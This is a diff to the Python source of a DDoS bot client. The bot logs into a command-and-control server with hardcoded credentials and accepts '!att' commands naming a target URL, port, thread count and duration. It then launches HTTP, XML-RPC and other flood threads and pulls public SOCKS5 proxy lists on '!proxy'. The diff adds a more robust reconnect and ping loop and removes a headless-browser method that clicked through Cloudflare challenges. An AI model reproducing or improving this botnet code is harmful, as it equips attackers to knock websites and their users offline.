@@ -189,32 +189,6 @@ def tcp_connhex(path , target , ua , cookie):
     hex_payload = ''.join(f'\\x{b:02x}' for b in payl_bytes)
     return hex_payload
 
-
-def get_cookies(driver):
-    cookies = driver.get_cookies()
-    pieces = []
-    for cookie in cookies:
-        cookie_string = cookie["name"] + "=" + cookie["value"]
-        pieces.append(cookie_string)
-    return ";".join(pieces)
-
-def wait_for_load_event(driver , event , timeout , retries = 0):
-        if retries == timeout:
-            return Exception("timeout exceeded")
-        try:
-            sleep(1)
-            state = driver.execute_script("return document.readyState")
-            if state != "complete":
-                wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
-        except:
-            wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
-def wait_for_navigate(driver):
-        wait_for_load_event(driver=driver , event="loading" , timeout=30)
-        wait_for_load_event(driver=driver , event="complete " , timeout=30)
-def wait_for_selector_visible(driver, selector, timeout):
-        WebDriverWait(driver=driver, timeout=timeout, poll_frequency=1).until(
-            lambda driver: driver.find_element("css selector" , selector).is_displayed()
-        )
 def socks5geter():
     prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
     prapi2 = "https://github.com/zloi-user/hideip.me/blob/main/https.txt"
@@ -273,41 +247,69 @@ def socks5geter():
     pf.close()
     
 def main():
-    s = socket(AF_INET , SOCK_STREAM)
-    while 1:
-        try:
-            s.connect((ipc2 , portc2))
-            print('vpn connected')
-            sleep(0.5)
-            while 1:
-                data = s.recv(1024).decode()
-                if "Username" in data:
-                    s.send("kediam".encode())
-                    break
-            while 1:
-                data = s.recv(1024).decode()
-                if "Password" in data:
-                    s.send("FSOCIETY".encode())
-                    break
-            break
-        except:
-            sleep(5)
     while True:
+        s = None
+        connected = False
+        while not connected:
+            try:
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((ipc2, portc2))
+                print("VPN connected.")
+                connected = True 
+                while True:
+                    data = s.recv(1024)
+                    if b"Username" in data:
+                        s.send("kediam".encode())
+                        break
+                while True:
+                    data = s.recv(1024)
+                    if b"Password" in data:
+                        s.send("FSOCIETY".encode())
+                        break
+            except Exception as e:
+                if s:
+                    try:
+                        s.close()
+                    except:
+                        pass
+                s = None
+                sleep(5)
         try:
-            c2 = s.recv(1024).decode().strip()
-            if c2.split()[0] == '!att':
-                method = str(c2.split()[1])
-                url = str(c2.split()[2])
-                port = int(c2.split()[3])
-                threads = int(c2.split()[4])
-                rpc = int(c2.split()[5])
-                timme = int(c2.split()[6])
-                timer = time() + timme
-            elif c2.split()[0] == '!proxy':
-                thr(target=socks5geter).start()
+            while True:
+                try:
+                    data = s.recv(1024)
+                    if not data:
+                        raise ConnectionResetError("Connection closed by server.")
+                    try:
+                        c2 = data.decode('utf-8', errors='ignore').strip()
+                    except UnicodeDecodeError as e:
+                        continue
+
+                    if c2.split()[0] == '!att':
+                        print(c2)
+                        method = str(c2.split()[1])
+                        url = str(c2.split()[2])
+                        port = int(c2.split()[3])
+                        threads = int(c2.split()[4])
+                        rpc = int(c2.split()[5])
+                        timme = int(c2.split()[6])
+                        timer = time() + timme
+                    elif c2.split()[0] == '!proxy':
+                        thr(target=socks5geter).start()
+                    elif c2.split()[0] == '[+]ping':
+                        s.send(b'pong')
+                except:
+                    break
         except:
             pass
-
+        finally:
+            if s:
+                try:
+                    s.close()
+                except:
+                    pass
+            connected = False
+            sleep(5)
         try:
             us = UserAgent()
             ua = us.random
@@ -482,89 +484,6 @@ def main():
                             s.send(payl)
                     except:
                         pass
-            def browser():
-                chrome_options = Options()
-                user_agent = UserAgent()
-                options = Options()
-                options.add_argument("--disable-features=Translate,OptimizationHints,MediaRouter")
-                options.add_argument("--disable-extensions")
-                options.add_argument("--disable-component-extensions-with-background-pages")
-                options.add_argument("--disable-background-networking")
-                options.add_argument("--disable-component-update")
-                options.add_argument("--disable-client-side-phishing-detection")
-                options.add_argument("--disable-sync")
-                options.add_argument("--metrics-recording-only")
-                options.add_argument("--disable-default-apps")
-                options.add_argument("--mute-audio")
-                options.add_argument("--no-default-browser-check")
-                options.add_argument("--no-first-run")
-                options.add_argument("--disable-backgrounding-occluded-windows")
-                options.add_argument("--disable-renderer-backgrounding")
-                options.add_argument("--disable-background-timer-throttling")
-                options.add_argument("--disable-ipc-flooding-protection")
-                options.add_argument("--password-store=basic")
-                options.add_argument("--use-mock-keychain")
-                options.add_argument("--force-fieldtrials=*BackgroundTracing/default/")
-                options.add_argument("--allow-pre-commit-input")
-                options.add_argument("--disable-breakpad")
-                options.add_argument("--disable-dev-shm-usage")
-                options.add_argument("--disable-hang-monitor")
-                options.add_argument("--disable-popup-blocking")
-                options.add_argument("--disable-prompt-on-repost")
-                options.add_argument("--disable-search-engine-choice-screen")
-                options.add_argument("--enable-blink-features=IdleDetection")
-                options.add_argument("--enable-features=NetworkServiceInProcess2")
-                options.add_argument("--export-tagged-pdf")
-                options.add_argument("--force-color-profile=srgb")
-                options.add_argument("--disable-features=Translate,AcceptCHFrame,MediaRouter,OptimizationHints")
-                options.add_argument("--test-type")
-                options.add_argument("--renderer-process-limit=1")
-                options.add_argument("--in-process-gpu")
-                options.add_argument("--disable-gpu")
-                options.add_argument("--disable-setuid-sandbox")
-                options.add_argument("--no-zygote")
-                options.add_argument("--no-sandbox")
-                options.add_argument("--headless=new")
-                options.add_argument("--user-agent=" + user_agent)
-                service = Service()
-                driver = webdriver.Chrome(service=service , options=chrome_options)
-                driver.get(url)
-                sleep(5)
-                try:
-                    captcha_element = driver.find_element(By.ID , "captcha")
-                    captcha_element.click()
-                    driver.execute_script(f"window.open('{url}', '_blank');")
-                    sleep(30)
-                    driver.switch_to.window(
-                        window_name=driver.window_handles[0]
-                    )
-                    driver.close()
-                    driver.switch_to.window(
-                        window_name=driver.window_handles[0]
-                    )
-                    source = driver.page_source
-                    if "access denied" in driver.title.lower():
-                        driver.quit()
-                    if "challenge-platform" in source:
-                        CLOUDFLARE_CAPTCHA_SELECTOR = "iframe[src*='challenges']"
-                        CLOUDFLARE_CHECKBOX_SELECTOR = "input[type='checkbox']"
-                        wait_for_selector_visible(driver=driver, selector=CLOUDFLARE_CAPTCHA_SELECTOR, timeout=30)
-                        captcha_box = driver.find_element("css selector", CLOUDFLARE_CAPTCHA_SELECTOR)
-                        driver.switch_to.frame(captcha_box)
-                        sleep(12)
-                        captcha_checkbox = driver.find_element("css selector", CLOUDFLARE_CHECKBOX_SELECTOR)
-                        actions = ActionChains(driver=driver)
-                        actions.click(captcha_checkbox)
-                        actions.perform()
-                        driver.switch_to.default_content()
-                        wait_for_navigate(driver=driver)
-                        sleep(12)
-                except:
-                    pass
-                sleep(9)
-                driver.quit()
-                return driver
-
             def put():
                 while time() < timer:
                     try:
@@ -1046,9 +965,6 @@ def main():
             elif method == 'http':
                 for _ in range(threads):
                     thr(target=http).start()
-            elif method == 'browser':
-                for _ in range(threads):
-                    thr(target=browser).start()
             elif method == 'xmlrpc':
                 for _ in range(threads):
                     thr(target=xmlrpc).start()
